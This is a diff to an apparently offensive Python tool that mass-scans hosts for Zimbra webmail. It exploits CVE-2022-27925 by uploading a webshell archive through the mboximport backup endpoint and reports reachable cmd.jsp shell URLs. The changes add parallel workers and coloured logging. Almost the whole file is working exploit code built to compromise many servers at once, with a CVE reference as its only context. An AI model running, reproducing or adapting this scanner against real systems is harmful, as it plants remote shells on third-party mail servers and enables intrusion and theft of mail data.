@@ -1,9 +1,11 @@
 #!/usr/bin/env python
 # https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27925
 import argparse
+import multiprocessing as mp
 import os
 import sys
-from concurrent.futures import ProcessPoolExecutor
+from enum import Enum
+from functools import partial
 from pathlib import Path
 from typing import Any, Sequence
 
@@ -11,17 +13,20 @@ import requests
 
 requests.packages.urllib3.disable_warnings()
 
+CSI = '\033['
+
+Color = Enum(
+    'Color', 'black red green yellow blue magenta cyan white', start=30
+)
+
 USER_AGENT = (
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
     ' AppleWebKit/537.36 (KHTML, like Gecko)'
     ' Chrome/104.0.0.0 Safari/537.36'
 )
+
 ZIMBRA_SUBDOMAINS = ['mail', 'email', 'webmail', 'zimbra']
 ZIMBRA_TITLE = '<title>Zimbra Web Client Sign In</title>'
-IMPORT_ENDPOINTS = [
-    '/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd',
-    '/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=',
-]
 
 
 def parse_args(argv: Sequence | None) -> argparse.Namespace:
@@ -39,7 +44,7 @@ def parse_args(argv: Sequence | None) -> argparse.Namespace:
         '-w',
         '--workers',
         type=int,
-        default=os.cpu_count(),
+        default=os.cpu_count() * 2,
         help='number of workers',
     )
     return parser.parse_args(argv)
@@ -51,44 +56,64 @@ def get_session() -> requests.Session:
     return s
 
 
-def LOG(obj: Any, *args: Any):
-    print(str(obj) % args, file=sys.stderr)
+def log(message: Any, *args: Any, color: Color | str = Color.green) -> None:
+    if isinstance(color, str):
+        color = Color[color]
+    print(f'{CSI}{color.value}m{str(message) % args}{CSI}0m', file=sys.stderr)
 
 
-def check_exploit(sess: requests.Session, url: str) -> str | None:
+warn = partial(log, color='red')
+
+
+def exploit(session: requests.Session, url: str) -> None:
     # https://github.com/MeDx64/CVE-2022-27925/blob/main/CVE-2022-27925.py
     with (Path(__file__).parent / 'webshell.zip').open('rb') as fp:
         payload = fp.read()
-    for endpoint in IMPORT_ENDPOINTS:
-        endpoint_url = url + endpoint
-        LOG('check endpoint: %s', endpoint_url)
-        r = sess.post(
-            endpoint_url,
-            data=payload,
-            headers={'Content-Type': 'application/x-www-form-urlencoded'},
-            timeout=5.0,
-            verify=False,
-        )
-        LOG('status code: %d', r.status_code)
-        if r.status_code == 401:
-            exploit_url = url + '/zimbraAdmin/cmd.jsp'
-            r1 = sess.get(exploit_url, timeout=5.0, verify=False)
-            if r1.status_code == 200:
-                LOG('exploit url: %s', exploit_url)
-                return r1.url
+    endpoint = (
+        url
+        + '/service/extension/backup/mboximport?account-name=admin&ow=1&no-switch=true'
+    )
+    log('check endpoint: %s', endpoint)
+    r = session.post(
+        endpoint,
+        data=payload,
+        headers={'Content-Type': 'application/x-www-form-urlencoded'},
+        timeout=5.0,
+        verify=False,
+    )
+    log('%d ‒ %s', r.status_code, r.url)
+    if r.status_code != 401:
+        return
+    shell_url = url + '/zimbraAdmin/cmd.jsp'
+    r = session.get(shell_url, timeout=5.0, verify=False)
+    if r.status_code == 200:
+        log('shell has uploaded successfully: %s', shell_url)
+        print(shell_url, flush=True)
+    else:
+        warn('shell not found: %s', shell_url)
 
 
-def check_zimbra(base_url: str) -> str | None:
-    sess = get_session()
+def check_zimbra(session: requests.Session, base_url: str) -> None:
     for subdomain in ZIMBRA_SUBDOMAINS:
         try:
             url = base_url.replace('://', f'://{subdomain}.')
-            r = sess.get(url, timeout=5.0, verify=False)
+            r = session.get(url, timeout=5.0, verify=False)
             if ZIMBRA_TITLE in r.text:
-                LOG('zimbra detected: %s', url)
-                return check_exploit(sess, url)
+                log('found: %s', url)
+                exploit(session, url)
+                break
         except Exception as e:
-            LOG(e)
+            warn(e)
+
+
+def worker(q: mp.JoinableQueue) -> None:
+    session = get_session()
+    while not q.empty():
+        try:
+            url = q.get()
+            check_zimbra(session, url)
+        finally:
+            q.task_done()
 
 
 def normalize_url(url: str) -> str:
@@ -97,15 +122,22 @@ def normalize_url(url: str) -> str:
 
 def main(argv: Sequence | None = None) -> None:
     args = parse_args(argv)
-    urls = []
+    q = mp.JoinableQueue()
+
     for line in args.input:
         if not (url := line.strip()):
             break
-        urls.append(normalize_url(url))
-    executor = ProcessPoolExecutor(max_workers=args.workers)
-    for result in executor.map(check_zimbra, urls):
-        if result:
-            print(result, flush=True)
+        q.put_nowait(normalize_url(url))
+
+    workers = []
+    for _ in range(args.workers):
+        w = mp.Process(target=worker, args=(q,), daemon=True)
+        w.start()
+
+    q.join()
+
+    for w in workers:
+        w.join()
 
 
 if __name__ == '__main__':
